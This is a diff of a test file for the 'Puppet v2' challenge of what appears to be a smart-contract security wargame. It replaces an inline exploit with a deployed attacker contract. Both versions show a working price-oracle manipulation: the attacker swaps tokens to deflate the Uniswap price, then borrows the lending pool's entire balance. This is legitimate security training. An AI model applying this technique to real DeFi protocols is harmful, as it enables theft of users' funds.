@@ -82,20 +82,20 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
-        await this.token.connect(attacker).approve(this.uniswapRouter.address, ATTACKER_INITIAL_TOKEN_BALANCE);
-        await this.uniswapRouter.connect(attacker).swapExactTokensForTokens(
-            ATTACKER_INITIAL_TOKEN_BALANCE,
-            0,
-            [this.token.address, this.weth.address],
-            attacker.address,
-            (await ethers.provider.getBlock('latest')).timestamp * 2,
+        const attackContract = await (await ethers.getContractFactory('PuppetV2Attacker', attacker)).deploy(
+            this.token.address,
+            this.weth.address,
+            this.uniswapRouter.address,
+            this.lendingPool.address
         );
-        const depositRequired = await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
-        const wethBalance = await this.weth.balanceOf(attacker.address);
-        const wethNeeded = depositRequired.sub(wethBalance);
-        await this.weth.connect(attacker).deposit({ value: wethNeeded });
-        await this.weth.connect(attacker).approve(this.lendingPool.address, depositRequired);
-        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE);
+
+        await attacker.sendTransaction({
+            to: attackContract.address,
+            value: ethers.utils.parseEther("19.6"),
+        });
+
+        await this.token.connect(attacker).approve(attackContract.address, ATTACKER_INITIAL_TOKEN_BALANCE);
+        await attackContract.connect(attacker).attack();
     });
 
     after(async function () {
